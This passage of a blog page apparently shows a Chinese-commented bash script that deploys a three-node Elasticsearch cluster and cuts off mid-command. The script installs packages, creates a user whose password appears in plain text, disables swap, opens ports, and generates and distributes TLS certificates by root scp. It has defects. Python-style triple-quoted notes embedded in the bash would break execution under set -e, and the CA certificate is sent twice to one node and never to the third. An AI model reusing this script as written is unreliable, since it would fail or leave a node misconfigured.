class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># -------------------------------- 开启严格模式 ---------------------------------------------</span><br><span class="hljs-built_in">set</span> -euo pipefail<br><br><span class="hljs-comment"># -------------------------------- 检查是否以 root 权限运行 ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这个脚本需要以 root 用户运行&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 安装 openssl ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 openssl&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 openssl 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v openssl &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 openssl，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get install -y openssl; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 openssl 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. command -v openssl：</span><br><span class="hljs-string">1. command -v openssl 用于检测 openssl 命令是否存在于当前系统的环境变量 PATH 指定的路径中</span><br><span class="hljs-string">2. 如果找到了，会输出完整路径（例如 /usr/bin/openssl），并返回退出码 0（true），表示命令执行成功、任务也成功（即找到了）</span><br><span class="hljs-string">3. 如果找不到，不会输出任何内容，但命令本身仍然成功执行，只是任务失败（未找到命令），这时返回退出码为 1（false）</span><br><span class="hljs-string">2. &gt;/dev/null</span><br><span class="hljs-string">1. &gt; 是输出重定向符，默认只作用于标准输出（stdout）。</span><br><span class="hljs-string">2. /dev/null 是 Linux 中的“黑洞”文件，任何输出重定向到这里都会被吞掉，相当于“我不想看到这个输出”。</span><br><span class="hljs-string">3. 因此，&gt;/dev/null 表示：将命令的标准输出重定向到黑洞中，不显示在终端上。</span><br><span class="hljs-string">3. 2&gt;&amp;1</span><br><span class="hljs-string">1. 1 表示标准输出，2 表示标准错误输出</span><br><span class="hljs-string">2. 2&gt;&amp;1 的意思是：“将标准错误重定向到标准输出的输出位置上”</span><br><span class="hljs-string">3. 因为前面已经执行了 &gt;/dev/null，所以标准输出已经被扔进黑洞了，这时候标准错误也跟着一起被重定向到黑洞。</span><br><span class="hljs-string">4. if...then...else...fi</span><br><span class="hljs-string">5. max_retries=3</span><br><span class="hljs-string">1. 最大重试次数，总共 3 + 1 次</span><br><span class="hljs-string">6. retry_count=0</span><br><span class="hljs-string">1. 已重试的次数</span><br><span class="hljs-string">7. until apt-get install -y openssl; do</span><br><span class="hljs-string">1. 执行 apt-get install -y openssl; 成功就退出循环，不成功就继续循环</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 dos2unix ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 dos2unix&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 dos2unix 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v dos2unix &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dos2unix 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 dos2unix，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get install -y dos2unix; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 dos2unix 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dos2unix 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 安装 chrony ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 chrony&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 chrony 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v chronyd &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 chrony，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get update &amp;&amp; apt-get install -y chrony; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 chrony 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>        <span class="hljs-built_in">sleep</span> 2<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 时间同步 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始时间同步&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在启动 chrony 服务...&quot;</span><br><span class="hljs-keyword">if</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; systemctl start chrony; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 服务已启动&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;启动 chrony 失败&quot;</span> &gt;&amp;2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 创建 es 用户 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建 es 用户&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已有 es 用户（包括其主目录）&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-string">&quot;es&quot;</span> &amp;&gt;/dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已有 es 用户，正在删除...&quot;</span><br>    userdel -r es<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已删除旧的 es 用户&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;新增 es 用户&quot;</span><br>useradd -m -s /bin/bash es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;为 es 用户设置密码（wq666）&quot;</span><br>passwd es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建 es 用户完成&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. id &quot;</span>es<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. 用于检查 es 用户是否存在</span><br><span class="hljs-string">2. 如果存在，会输出例如：uid=1001(es) gid=1001(es) groups=1001(es)</span><br><span class="hljs-string">2. userdel -r es</span><br><span class="hljs-string">1. 删除用户和其主目录</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 关闭 Swap 分区 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始关闭 Swap 分区&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 内容注释&quot;</span><br>sed -i <span class="hljs-string">&#x27;/^[^#].*\bswap\b/ s/^/#/&#x27;</span> /etc/fstab<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;立即关闭 Swap 分区&quot;</span><br>swapoff -a<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;关闭 Swap 分区完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 开放 9200、9300 TCP 端口 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始开放 9200、9300 TCP 端口&quot;</span><br>ufw allow 9200/tcp &amp;&amp; ufw allow 9300/tcp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开放 9200、9300 TCP 端口完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 设置主机名、主机名互相解析 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始设置主机名、主机名互相解析&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;获取本机内网 IP 地址&quot;</span><br>INTERFACE=$(ip <span class="hljs-built_in">link</span> | grep -oP <span class="hljs-string">&#x27;^[0-9]+: \K[^:]+&#x27;</span> | grep -v lo | <span class="hljs-built_in">head</span> -1)<br>LOCAL_IP=$(ip addr show <span class="hljs-string">&quot;<span class="hljs-variable">$INTERFACE</span>&quot;</span> | grep -oP <span class="hljs-string">&#x27;inet \K[\d.]+&#x27;</span> | <span class="hljs-built_in">head</span> -1)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不能获取本机 IP 地址&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本机内网 IP 地址获取成功：<span class="hljs-variable">$LOCAL_IP</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置本机主机名&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> <span class="hljs-keyword">in</span><br>    <span class="hljs-string">&quot;192.168.136.8&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node1&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.9&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node2&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.10&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node3&quot;</span><br>        ;;<br>    *)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IP <span class="hljs-variable">$LOCAL_IP</span> does not match any configured hostname&quot;</span> &gt;&amp;2<br>        <span class="hljs-built_in">exit</span> 1<br>        ;;<br><span class="hljs-keyword">esac</span><br>hostnamectl set-hostname <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTNAME</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名互相解析&quot;</span><br>HOSTS_CONTENT=<span class="hljs-string">&quot;</span><br><span class="hljs-string">192.168.136.8   es-node1</span><br><span class="hljs-string">192.168.136.9   es-node2</span><br><span class="hljs-string">192.168.136.10  es-node3&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 /etc/hosts 是否已包含指定追加内容&quot;</span><br><span class="hljs-keyword">if</span> grep -Fx <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> /etc/hosts &gt; /dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已存在，跳过添加&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> &gt;&gt; /etc/hosts<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已添加&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名、主机名互相解析完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 ES ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 ES&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 /mystudy/es 目录&quot;</span><br><span class="hljs-built_in">cd</span> /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已存在 ES 目录&quot;</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;/mystudy/es/elasticsearch&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已存在 ES 目录，准备删除...&quot;</span><br>    <span class="hljs-built_in">rm</span> -rf /mystudy/es/elasticsearch<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 目录已删除&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查是否存在 ES 安装包&quot;</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;elasticsearch-8.18.0-linux-x86_64.tar.gz&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 安装包不存在&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;解压&quot;</span><br>tar -zxvf elasticsearch-8.18.0-linux-x86_64.tar.gz -C /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;重命名&quot;</span><br><span class="hljs-built_in">mv</span> elasticsearch-8.18.0 elasticsearch<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 ES 完成&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. [ -d &quot;</span>path<span class="hljs-string">&quot; ]:</span><br><span class="hljs-string">1. path 是一个存在的目录吗？</span><br><span class="hljs-string">2. 类似的有：</span><br><span class="hljs-string">1. -f &quot;</span>path<span class="hljs-string">&quot;：</span><br><span class="hljs-string">1. path 是一个存在的文件吗？</span><br><span class="hljs-string">2. -e &quot;</span>path<span class="hljs-string">&quot;：</span><br><span class="hljs-string">1. path 是一个存在的路径吗？（文件或目录）</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放 ES 数据的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放 ES 数据的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p /mystudy/es/elasticsearch/data<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放 ES 数据的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放证书的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放证书的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p /mystudy/es/elasticsearch/config/certs<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放证书的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 生成 CA 证书、CA 公钥（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上生成 CA 证书、CA 公钥&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 ca 证书&quot;</span><br>    bin/elasticsearch-certutil ca<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;导出 CA 公钥&quot;</span><br>    openssl pkcs12 -<span class="hljs-keyword">in</span> elastic-stack-ca.p12 -nokeys -out ca.crt || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;导出 CA 公钥失败&quot;</span> &gt;&amp;2; <span class="hljs-built_in">exit</span> 1; &#125;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 CA 证书、CA 公钥放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> elastic-stack-ca.p12 ca.crt /mystudy/es/elasticsearch/config/certs/ || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;移动证书文件失败&quot;</span> &gt;&amp;2; <span class="hljs-built_in">exit</span> 1; &#125;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成 CA 证书、CA 公钥完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发节点证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; instances.yml &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>        --silent \<br>        --<span class="hljs-keyword">in</span> instances.yml \<br>        --ca config/certs/elastic-stack-ca.p12 \<br>        --pem \<br>        --out certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 certs.zip 放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> certs.zip config/certs/<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发节点证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发 HTTPS 证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在192.168.136.8 上签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 http-instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; http-instances.yml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>      --silent \<br>      --<span class="hljs-keyword">in</span> http-instances.yml \<br>      --ca  config/certs/elastic-stack-ca.p12 \<br>      --pem \<br>      --out http-certs.zip || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成 HTTPS 证书失败&quot;</span> &gt;&amp;2; <span class="hljs-built_in">exit</span> 1; &#125;<br><br>    <span class="hljs-built_in">mv</span> http-certs.zip config/certs/ || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;移动 http-certs.zip 失败&quot;</span> &gt;&amp;2; <span class="hljs-built_in">exit</span> 1; &#125;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 HTTPS 证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 分发证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上分发证书&quot;</span><br>    <span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch/config/certs<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发节点证书&quot;</span><br>    unzip certs.zip <br>    <span class="hljs-built_in">mv</span> /mystudy/es/elasticsearch/config/certs/es-node1/es-node1.&#123;crt,key&#125; /mystudy/es/elasticsearch/config/certs/<br>    scp /mystudy/es/elasticsearch/config/certs/es-node2/es-node2.&#123;crt,key&#125; \<br>        root@192.168.136.9:/mystudy/es/elasticsearch/config/certs/<br>    scp /mystudy/es/elasticsearch/config/certs/es-node3/es-node3.&#123;crt,key&#125; \<br>        root@192.168.136.10:/mystudy/es/elasticsearch/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发HTTPS 证书&quot;</span><br>    unzip http-certs.zip<br>    <span class="hljs-built_in">mv</span> /mystudy/es/elasticsearch/config/certs/es-node1-http/es-node1-http.&#123;crt,key&#125; /mystudy/es/elasticsearch/config/certs/<br>    scp /mystudy/es/elasticsearch/config/certs/es-node2-http/es-node2-http.&#123;crt,key&#125; \<br>        root@192.168.136.9:/mystudy/es/elasticsearch/config/certs/<br>    scp /mystudy/es/elasticsearch/config/certs/es-node3-http/es-node3-http.&#123;crt,key&#125; \<br>        root@192.168.136.10:/mystudy/es/elasticsearch/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发 CA 公钥&quot;</span><br>    scp /mystudy/es/elasticsearch/config/certs/ca.crt \<br>        root@192.168.136.9:/mystudy/es/elasticsearch/config/certs/<br>    scp /mystudy/es/elasticsearch/config/certs/ca.crt \<br>        root@192.168.136.9:/mystudy/es/elasticsearch/config/certs/<br>    <span class="hljs-built_in">rm</span> -rf es-node1 es-node1-http es-node2 es-node2-http es-node3 